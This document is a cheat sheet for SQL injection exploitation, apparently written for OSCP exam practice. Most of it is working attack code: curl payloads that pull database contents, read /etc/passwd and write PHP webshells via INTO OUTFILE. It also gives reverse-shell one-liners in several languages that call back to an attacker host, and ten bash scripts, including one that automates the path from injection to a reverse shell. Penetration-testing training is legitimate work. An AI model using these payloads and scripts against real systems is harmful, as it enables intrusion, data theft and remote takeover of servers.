# SQL Injection Tool Suggestions & Command Reference
**OSCP-Compliant Toolkit for SQL Injection Exploitation**

---

## 📚 Part 1: Consolidated Command Reference

### Environment Variables
```bash
export TARGET="192.168.X.X"
export PORT="80"
export PARAM="vulnerable_param"
export LHOST="192.168.45.X"  # Your VPN IP
export LPORT="443"
export WEBROOT="/var/www/html"
export DELAY="2"  # For time-based SQLi
```

---

## 🔍 Phase 1: Enumeration & Discovery

### Port Scanning
```bash
# Quick TCP scan
nmap -sV -sC -p- -T4 $TARGET -oA initial_scan

# Faster with min-rate
nmap -sV -sC -p- --min-rate 1000 $TARGET -oA fast_scan

# Service version detection
nmap -sV -p $PORT $TARGET
```

### Web Enumeration
```bash
# Technology detection
whatweb http://$TARGET:$PORT -v

# Directory discovery
gobuster dir -u http://$TARGET:$PORT -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,old,zip,sql -t 30

# Nikto scan
nikto -h http://$TARGET:$PORT -output nikto_results.txt

# Manual technology check
curl -I http://$TARGET:$PORT | grep -i "server\|x-powered-by"
```

### Parameter Discovery
```bash
# Extract form parameters
curl -s http://$TARGET:$PORT/$PAGE | grep -Eo 'name="[^"]*"' | cut -d'"' -f2 | sort -u

# Find all forms
curl -s http://$TARGET:$PORT/$PAGE | grep -Eo '<form[^>]*>' -A 20

# Find GET parameters in links
curl -s http://$TARGET:$PORT/$PAGE | grep -Eo 'href="[^"]*\?[^"]*"'

# Extract input fields with types
curl -s http://$TARGET:$PORT/$PAGE | grep -Eo '<input[^>]*>' | grep -Eo 'name="[^"]*"|type="[^"]*"'

# Look for AJAX endpoints
curl -s http://$TARGET:$PORT/$PAGE | grep -Eo '(ajax|fetch|XMLHttpRequest|\.post|\.get)'

# Find hidden fields
curl -s http://$TARGET:$PORT/$PAGE | grep -i "type=\"hidden\""

# Extract comments
curl -s http://$TARGET:$PORT/$PAGE | grep -E '<!--.*-->'
```

---

## 💉 Phase 2: SQL Injection Testing

### Error-Based Detection
```bash
# Single quote test
curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test'" -s | grep -i "sql\|mysql\|error\|warning"

# GET request test
curl "http://$TARGET:$PORT/$PAGE?$PARAM=test'" -s | grep -i "error"

# Double quote test
curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test\"" -s | grep -i "error"

# Comment variations
curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test'-- -" -s | head -20
curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test'#" -s | head -20
curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test'/*comment*/" -s | head -20
```

### Time-Based Blind Detection
```bash
# Basic sleep test
time curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test' AND SLEEP($DELAY)-- -" -s -o /dev/null

# MySQL sleep
time curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test' AND (SELECT SLEEP($DELAY))-- -" -s -o /dev/null

# PostgreSQL sleep
time curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test' AND pg_sleep($DELAY)-- -" -s -o /dev/null

# MSSQL sleep
time curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test'; WAITFOR DELAY '0:0:$DELAY'-- -" -s -o /dev/null

# Benchmark alternative (MySQL)
time curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test' AND BENCHMARK(5000000,MD5('test'))-- -" -s -o /dev/null
```

### Column Enumeration
```bash
# ORDER BY method
for i in {1..20}; do
  echo -n "Testing $i columns: "
  curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test' ORDER BY $i-- -" -s | grep -q "error" && echo "Error at $i" && break || echo "OK"
done

# UNION SELECT with NULL
for i in {1..10}; do
  NULLS=$(printf 'NULL,%.0s' {1..$i} | sed 's/,$//')
  curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test' UNION SELECT $NULLS-- -" -s | grep -q "error" || echo "Column count: $i"
done
```

### Data Extraction
```bash
# Database name
curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test' UNION SELECT database()-- -" -s | tail -20

# MySQL version
curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test' UNION SELECT @@version-- -" -s | tail -20

# Current user
curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test' UNION SELECT user()-- -" -s | tail -20
curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test' UNION SELECT current_user()-- -" -s | tail -20

# All databases
curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test' UNION SELECT schema_name FROM information_schema.schemata-- -" -s | tail -20

# Tables in current database
curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -" -s | tail -20

# Columns in specific table
curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='$TABLE'-- -" -s | tail -20

# Extract data
curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test' UNION SELECT concat($COL1,':',$COL2) FROM $TABLE-- -" -s | tail -20
```

### Time-Based Blind Extraction
```bash
# Check database name length
for len in {1..20}; do
  response_time=$(curl -X POST http://$TARGET:$PORT/$PAGE \
    -d "$PARAM=test' AND IF(LENGTH(database())=$len,SLEEP($DELAY),0)-- -" \
    -s -w "%{time_total}" -o /dev/null)
  (( $(echo "$response_time > $DELAY" | bc -l) )) && echo "Length: $len" && break
done

# Extract character at position
for char in {a..z} {0..9} _; do
  response_time=$(curl -X POST http://$TARGET:$PORT/$PAGE \
    -d "$PARAM=test' AND IF(SUBSTRING(database(),$POS,1)='$char',SLEEP($DELAY),0)-- -" \
    -s -w "%{time_total}" -o /dev/null)
  (( $(echo "$response_time > $DELAY" | bc -l) )) && echo "Found: $char" && break
done

# Binary search extraction (faster)
low=32; high=126
while [ $low -le $high ]; do
  mid=$(( (low + high) / 2 ))
  response_time=$(curl -X POST http://$TARGET:$PORT/$PAGE \
    -d "$PARAM=test' AND IF(ASCII(SUBSTRING(database(),$POS,1))>$mid,SLEEP($DELAY),0)-- -" \
    -s -w "%{time_total}" -o /dev/null)
  if (( $(echo "$response_time > $DELAY" | bc -l) )); then
    low=$((mid + 1))
  else
    high=$((mid - 1))
  fi
done
```

---

## 🎯 Phase 3: Exploitation

### File Operations
```bash
# Test file read
curl -X POST http://$TARGET:$PORT/$PAGE -d "$PARAM=test' UNION SELECT load_file('/etc/passwd')-- -" -s | tail -50

# Test file write
curl -X POST http://$TARGET:$PORT/$PAGE \
  -d "$PARAM=test' UNION SELECT 'TEST' INTO OUTFILE '$WEBROOT/test.txt'-- -" -s

# Verify file write
curl http://$TARGET:$PORT/test.txt

# Write with multiple columns (adjust NULLs to match column count)
curl -X POST http://$TARGET:$PORT/$PAGE \
  -d "$PARAM=test' UNION SELECT 'TEST',NULL,NULL,NULL,NULL,NULL INTO OUTFILE '$WEBROOT/test2.txt'-- -"

# Alternative: INTO DUMPFILE (for binary files)
curl -X POST http://$TARGET:$PORT/$PAGE \
  -d "$PARAM=test' UNION SELECT '<?php phpinfo(); ?>' INTO DUMPFILE '$WEBROOT/info.php'-- -"
```

### Webshell Deployment
```bash
# Simple command execution shell
curl -X POST http://$TARGET:$PORT/$PAGE \
  --data-urlencode "$PARAM=test' UNION SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '$WEBROOT/cmd.php'-- -"

# Alternative with shell_exec
curl -X POST http://$TARGET:$PORT/$PAGE \
  --data-urlencode "$PARAM=test' UNION SELECT '<?php echo shell_exec(\$_GET[\"c\"]); ?>' INTO OUTFILE '$WEBROOT/shell.php'-- -"

# Full featured webshell
curl -X POST http://$TARGET:$PORT/$PAGE \
  --data-urlencode "$PARAM=test' UNION SELECT '<?php if(isset(\$_REQUEST[\"cmd\"])){echo \"<pre>\"; \$cmd = (\$_REQUEST[\"cmd\"]); system(\$cmd); echo \"</pre>\"; die; }?>' INTO OUTFILE '$WEBROOT/webshell.php'-- -"

# Test webshell
curl "http://$TARGET:$PORT/cmd.php?cmd=whoami"
curl -G "http://$TARGET:$PORT/shell.php" --data-urlencode "c=id"
```

### Reverse Shell Execution
```bash
# Netcat listener (on Kali)
nc -lvnp $LPORT

# Trigger reverse shell via webshell - Netcat
curl -G "http://$TARGET:$PORT/cmd.php" --data-urlencode "cmd=nc -e /bin/bash $LHOST $LPORT"

# Bash reverse shell
curl -G "http://$TARGET:$PORT/cmd.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"

# Python reverse shell
curl -G "http://$TARGET:$PORT/cmd.php" \
  --data-urlencode "cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"

# PHP reverse shell
curl -G "http://$TARGET:$PORT/cmd.php" \
  --data-urlencode "cmd=php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"

# Perl reverse shell
curl -G "http://$TARGET:$PORT/cmd.php" \
  --data-urlencode "cmd=perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
```

### MySQL Privilege Checks
```bash
# Check user privileges
curl -X POST http://$TARGET:$PORT/$PAGE \
  -d "$PARAM=test' UNION SELECT grantee FROM information_schema.user_privileges-- -" -s | tail -20

# Check FILE privilege
curl -X POST http://$TARGET:$PORT/$PAGE \
  -d "$PARAM=test' UNION SELECT privilege_type FROM information_schema.user_privileges WHERE privilege_type='FILE'-- -" -s | tail -20

# Check all privileges for current user
curl -X POST http://$TARGET:$PORT/$PAGE \
  -d "$PARAM=test' UNION SELECT group_concat(privilege_type) FROM information_schema.user_privileges WHERE grantee LIKE concat('%',current_user(),'%')-- -" -s | tail -20
```

---

## 🛠️ Part 2: OSCP-Compliant Toolkit Scripts

### 1. `sqli_detector.sh` - Quick SQLi Vulnerability Check
```bash
#!/bin/bash
# Usage: ./sqli_detector.sh <target> <page> <param> [method]

TARGET=$1
PAGE=$2
PARAM=$3
METHOD=${4:-POST}

echo "[*] Testing for SQL Injection on $TARGET$PAGE - Parameter: $PARAM"

# Error-based tests
PAYLOADS=("'" "\"" "' OR '1'='1" "' AND SLEEP(3)-- -")

for payload in "${PAYLOADS[@]}"; do
    echo -n "[*] Testing: $payload ... "
    if [ "$METHOD" = "GET" ]; then
        response=$(curl -s "$TARGET$PAGE?$PARAM=$payload" 2>/dev/null)
    else
        response=$(curl -s -X POST "$TARGET$PAGE" -d "$PARAM=$payload" 2>/dev/null)
    fi

    if echo "$response" | grep -qi "sql\|mysql\|error\|warning"; then
        echo "VULNERABLE (Error-based)"
        echo "[!] Error found: $(echo "$response" | grep -i error | head -1)"
        exit 0
    fi
    echo "No error"
done

# Time-based test
echo -n "[*] Testing time-based blind SQLi ... "
start_time=$(date +%s)
curl -s -X POST "$TARGET$PAGE" -d "$PARAM=test' AND SLEEP(3)-- -" -o /dev/null 2>/dev/null
end_time=$(date +%s)
duration=$((end_time - start_time))

if [ $duration -ge 3 ]; then
    echo "VULNERABLE (Time-based)"
    exit 0
else
    echo "Not vulnerable"
fi

echo "[!] No SQL injection detected"
```

### 2. `column_counter.sh` - Automated Column Enumeration
```bash
#!/bin/bash
# Usage: ./column_counter.sh <target> <page> <param>

TARGET=$1
PAGE=$2
PARAM=$3
MAX_COLS=20

echo "[*] Detecting column count using ORDER BY..."

for i in $(seq 1 $MAX_COLS); do
    response=$(curl -s -X POST "$TARGET$PAGE" -d "$PARAM=test' ORDER BY $i-- -" 2>/dev/null)

    if echo "$response" | grep -qi "unknown column\|error"; then
        echo "[+] Column count: $((i-1))"
        exit 0
    fi
    echo -n "."
done

echo "[!] Could not determine column count (tried up to $MAX_COLS)"
```

### 3. `param_finder.sh` - Extract Form Parameters from HTML
```bash
#!/bin/bash
# Usage: ./param_finder.sh <target_url>

TARGET=$1
echo "[*] Extracting parameters from $TARGET"

# Get the page
HTML=$(curl -s "$TARGET" 2>/dev/null)

echo -e "\n[+] Form Parameters:"
echo "$HTML" | grep -Eo 'name="[^"]*"' | cut -d'"' -f2 | sort -u

echo -e "\n[+] Input Types:"
echo "$HTML" | grep -Eo '<input[^>]*>' | grep -Eo 'type="[^"]*"' | sort -u

echo -e "\n[+] Form Actions:"
echo "$HTML" | grep -Eo 'action="[^"]*"' | cut -d'"' -f2 | sort -u

echo -e "\n[+] GET Parameters in Links:"
echo "$HTML" | grep -Eo 'href="[^"]*\?[^"]*"' | grep -Eo '\?[^"]*' | tr '&' '\n' | cut -d'=' -f1 | sort -u

echo -e "\n[+] Hidden Fields:"
echo "$HTML" | grep -i 'type="hidden"' | grep -Eo 'name="[^"]*"' | cut -d'"' -f2
```

### 4. `time_extractor.sh` - Optimized Blind SQLi Data Extraction
```bash
#!/bin/bash
# Usage: ./time_extractor.sh <target> <page> <param> <query>

TARGET=$1
PAGE=$2
PARAM=$3
QUERY=$4
DELAY=2

extract_char() {
    local pos=$1
    local low=32
    local high=126

    while [ $low -le $high ]; do
        mid=$(( (low + high) / 2 ))

        payload="test' AND IF(ASCII(SUBSTRING(($QUERY),$pos,1))>$mid,SLEEP($DELAY),0)-- -"
        response_time=$(curl -s -X POST "$TARGET$PAGE" -d "$PARAM=$payload" -w "%{time_total}" -o /dev/null)

        if (( $(echo "$response_time > $DELAY" | bc -l) )); then
            low=$((mid + 1))
        else
            high=$((mid - 1))
        fi

        if [ $low -eq $((high + 1)) ]; then
            printf "\\$(printf '%03o' $high)"
            return
        fi
    done
}

# Find length
echo -n "[*] Finding length: "
for len in {1..50}; do
    payload="test' AND IF(LENGTH(($QUERY))=$len,SLEEP($DELAY),0)-- -"
    response_time=$(curl -s -X POST "$TARGET$PAGE" -d "$PARAM=$payload" -w "%{time_total}" -o /dev/null)

    if (( $(echo "$response_time > $DELAY" | bc -l) )); then
        echo "$len characters"

        echo -n "[*] Extracting: "
        for pos in $(seq 1 $len); do
            extract_char $pos
        done
        echo
        exit 0
    fi
done
```

### 5. `webshell_deployer.sh` - Deploy Various Webshell Types
```bash
#!/bin/bash
# Usage: ./webshell_deployer.sh <target> <page> <param> <webroot>

TARGET=$1
PAGE=$2
PARAM=$3
WEBROOT=$4
COLS=${5:-6}  # Default column count

# Generate NULL padding
NULLS=$(printf ',NULL%.0s' $(seq 2 $COLS))

RAND=$RANDOM
echo "[*] Deploying webshells with random suffix: $RAND"

# Simple command shell
echo -n "[*] Deploying command shell... "
curl -s -X POST "$TARGET$PAGE" \
    --data-urlencode "$PARAM=test' UNION SELECT '<?php system(\$_GET[\"cmd\"]); ?>'$NULLS INTO OUTFILE '$WEBROOT/cmd_$RAND.php'-- -" \
    -o /dev/null
curl -s "$TARGET/cmd_$RAND.php?cmd=whoami" | grep -q "www-data\|apache" && echo "SUCCESS: /cmd_$RAND.php" || echo "FAILED"

# Shell_exec variant
echo -n "[*] Deploying shell_exec variant... "
curl -s -X POST "$TARGET$PAGE" \
    --data-urlencode "$PARAM=test' UNION SELECT '<?php echo shell_exec(\$_GET[\"c\"]); ?>'$NULLS INTO OUTFILE '$WEBROOT/shell_$RAND.php'-- -" \
    -o /dev/null
curl -s "$TARGET/shell_$RAND.php?c=id" | grep -q "uid=" && echo "SUCCESS: /shell_$RAND.php" || echo "FAILED"

# Full featured shell
echo -n "[*] Deploying full shell... "
FULL_SHELL='<?php if(isset($_REQUEST["x"])){echo "<pre>";$x=($_REQUEST["x"]);system($x);echo "</pre>";die;}?>'
curl -s -X POST "$TARGET$PAGE" \
    --data-urlencode "$PARAM=test' UNION SELECT '$FULL_SHELL'$NULLS INTO OUTFILE '$WEBROOT/full_$RAND.php'-- -" \
    -o /dev/null
curl -s "$TARGET/full_$RAND.php?x=uname -a" | grep -q "Linux" && echo "SUCCESS: /full_$RAND.php" || echo "FAILED"
```

### 6. `mysql_privs_checker.sh` - Check MySQL User Privileges
```bash
#!/bin/bash
# Usage: ./mysql_privs_checker.sh <target> <page> <param>

TARGET=$1
PAGE=$2
PARAM=$3

echo "[*] Checking MySQL user privileges..."

# Get current user
echo -n "[*] Current user: "
curl -s -X POST "$TARGET$PAGE" -d "$PARAM=test' UNION SELECT user()-- -" | grep -Eo "[a-zA-Z0-9_]+@[a-zA-Z0-9%]+" | head -1

# Check dangerous privileges
PRIVS=("FILE" "SUPER" "CREATE" "DROP" "ALTER" "GRANT")

for priv in "${PRIVS[@]}"; do
    echo -n "[*] Checking $priv privilege: "
    response=$(curl -s -X POST "$TARGET$PAGE" \
        -d "$PARAM=test' UNION SELECT privilege_type FROM information_schema.user_privileges WHERE privilege_type='$priv' AND grantee LIKE concat('%',current_user(),'%')-- -")

    if echo "$response" | grep -q "$priv"; then
        echo "GRANTED"
        [ "$priv" = "FILE" ] && echo "    [!] Can read/write files!"
        [ "$priv" = "SUPER" ] && echo "    [!] Can execute commands!"
    else
        echo "not granted"
    fi
done
```

### 7. `file_writer.sh` - Test File Write Capabilities
```bash
#!/bin/bash
# Usage: ./file_writer.sh <target> <page> <param> <cols>

TARGET=$1
PAGE=$2
PARAM=$3
COLS=$4

# Common writable directories
DIRS=("/var/www/html" "/tmp" "/var/tmp" "/dev/shm" "/var/www" "/usr/share/nginx/html")

echo "[*] Testing file write capabilities..."

# Generate NULL padding
NULLS=$(printf ',NULL%.0s' $(seq 2 $COLS))

for dir in "${DIRS[@]}"; do
    echo -n "[*] Testing $dir ... "
    TEST_FILE="test_$RANDOM.txt"

    curl -s -X POST "$TARGET$PAGE" \
        -d "$PARAM=test' UNION SELECT 'TEST'$NULLS INTO OUTFILE '$dir/$TEST_FILE'-- -" \
        -o /dev/null 2>&1

    # Try to access if in web root
    if [[ "$dir" == *"/www/"* ]] || [[ "$dir" == *"/html"* ]]; then
        if curl -s "$TARGET/$TEST_FILE" 2>/dev/null | grep -q "TEST"; then
            echo "WRITABLE (web accessible)"
            echo "    [+] Webshell deployment possible at: $dir"
            exit 0
        fi
    fi

    echo "not writable or not accessible"
done

echo "[!] No writable web directories found"
```

### 8. `reverse_shell_gen.sh` - Generate Reverse Shells
```bash
#!/bin/bash
# Usage: ./reverse_shell_gen.sh <lhost> <lport>

LHOST=$1
LPORT=$2

echo "=== Reverse Shell Generator ==="
echo "[*] LHOST: $LHOST"
echo "[*] LPORT: $LPORT"
echo

echo "[+] Netcat:"
echo "nc -e /bin/bash $LHOST $LPORT"
echo

echo "[+] Bash:"
echo "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
echo

echo "[+] Python:"
cat << EOF
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
EOF
echo

echo "[+] PHP:"
echo "php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
echo

echo "[+] Perl:"
cat << EOF
perl -e 'use Socket;\$i="$LHOST";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
EOF
echo

echo "[+] Ruby:"
echo "ruby -rsocket -e 'f=TCPSocket.open(\"$LHOST\",$LPORT).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"
echo

echo "[+] URL Encoded (for webshells):"
echo -n "nc -e /bin/bash $LHOST $LPORT" | python3 -c "import sys; from urllib.parse import quote; print(quote(sys.stdin.read()))"
```

### 9. `binary_search_extractor.sh` - Fast Character Extraction
```bash
#!/bin/bash
# Usage: ./binary_search_extractor.sh <target> <page> <param> <position> <query>

TARGET=$1
PAGE=$2
PARAM=$3
POS=$4
QUERY=$5
DELAY=2

low=32
high=126

echo -n "[*] Extracting character at position $POS: "

while [ $low -le $high ]; do
    mid=$(( (low + high) / 2 ))

    payload="test' AND IF(ASCII(SUBSTRING(($QUERY),$POS,1))>$mid,SLEEP($DELAY),0)-- -"
    response_time=$(curl -s -X POST "$TARGET$PAGE" -d "$PARAM=$payload" -w "%{time_total}" -o /dev/null)

    if (( $(echo "$response_time > $DELAY" | bc -l) )); then
        low=$((mid + 1))
    else
        high=$((mid - 1))
    fi

    if [ $low -eq $((high + 1)) ]; then
        char=$(printf "\\$(printf '%03o' $high)")
        echo "$char (ASCII: $high)"
        exit 0
    fi
done

echo "Failed to extract character"
```

### 10. `sqli_to_shell.sh` - Semi-Automated SQLi to Shell
```bash
#!/bin/bash
# Usage: ./sqli_to_shell.sh <target> <lhost> <lport>

TARGET=$1
LHOST=$2
LPORT=$3
PORT=80
PAGE="/index.php"
PARAM="mail-list"  # Adjust based on target

echo "=== SQLi to Shell Semi-Automation ==="
echo "[*] Target: $TARGET"
echo "[*] Callback: $LHOST:$LPORT"
echo

# Step 1: Find columns
echo "[*] Step 1: Finding column count..."
for i in {1..10}; do
    if curl -s -X POST "$TARGET:$PORT$PAGE" -d "$PARAM=test' ORDER BY $i-- -" | grep -q "error"; then
        COLS=$((i-1))
        echo "[+] Found $COLS columns"
        break
    fi
done

# Step 2: Test file write
echo "[*] Step 2: Testing file write..."
NULLS=$(printf ',NULL%.0s' $(seq 2 $COLS))
RAND=$RANDOM

curl -s -X POST "$TARGET:$PORT$PAGE" \
    -d "$PARAM=test' UNION SELECT 'TEST'$NULLS INTO OUTFILE '/var/www/html/test_$RAND.txt'-- -" \
    -o /dev/null

if curl -s "$TARGET:$PORT/test_$RAND.txt" | grep -q "TEST"; then
    echo "[+] File write successful!"
else
    echo "[!] File write failed. Trying /tmp/..."
fi

# Step 3: Deploy webshell
echo "[*] Step 3: Deploying webshell..."
curl -s -X POST "$TARGET:$PORT$PAGE" \
    --data-urlencode "$PARAM=test' UNION SELECT '<?php system(\$_GET[\"c\"]); ?>'$NULLS INTO OUTFILE '/var/www/html/cmd_$RAND.php'-- -" \
    -o /dev/null

# Step 4: Test webshell
if curl -s "$TARGET:$PORT/cmd_$RAND.php?c=whoami" | grep -q "www-data\|apache"; then
    echo "[+] Webshell deployed: http://$TARGET:$PORT/cmd_$RAND.php"

    # Step 5: Get reverse shell
    echo "[*] Step 4: Starting listener on port $LPORT..."
    echo "[*] Run this in another terminal: nc -lvnp $LPORT"
    read -p "[*] Press Enter when listener is ready..."

    echo "[*] Triggering reverse shell..."
    curl -G "$TARGET:$PORT/cmd_$RAND.php" \
        --data-urlencode "c=nc -e /bin/bash $LHOST $LPORT" \
        -m 3 2>/dev/null &

    echo "[+] Check your listener!"
else
    echo "[!] Webshell deployment failed"
fi
```

---

## 📊 Usage Quick Reference

### Finding Your VPN IP
```bash
ip addr show tun0 | grep inet | awk '{print $2}' | cut -d'/' -f1
```

### Setting Up Listener
```bash
# Standard
nc -lvnp 443

# With rlwrap for better shell
rlwrap nc -lvnp 443

# Alternative with socat
socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Shell Upgrade
```bash
# After getting reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter twice
export TERM=xterm
```

### Useful Aliases
```bash
# Add to .bashrc for quick access
alias sqli-test='~/tools/sqli_detector.sh'
alias get-params='~/tools/param_finder.sh'
alias count-cols='~/tools/column_counter.sh'
alias deploy-shell='~/tools/webshell_deployer.sh'
alias check-privs='~/tools/mysql_privs_checker.sh'
alias gen-shells='~/tools/reverse_shell_gen.sh'
```

---

## 🎯 OSCP Exam Strategy

### Time Management
1. **Enumeration** (10-15 min): Run scripts in parallel
2. **SQLi Testing** (5 min): Use sqli_detector.sh
3. **Exploitation** (10-15 min): Deploy webshell, get reverse shell
4. **Total**: ~30 minutes from SQLi to shell

### Priority Order
1. Error-based SQLi (fastest if errors shown)
2. File write to webshell (if FILE privilege)
3. Time-based blind (slower but reliable)
4. Credential extraction → SSH (if time permits)

### Documentation
- Screenshot every successful command
- Save all working payloads
- Note exact syntax that works
- Track time for each phase

---

## 📝 Notes

- All scripts are OSCP-compliant (assist, not fully automate)
- Adjust DELAY variable based on network latency
- Always test baseline response time first
- Have multiple reverse shell payloads ready
- Document everything, especially what fails

**Remember**: Understanding > Automation. These tools reduce overhead but you must understand what they do!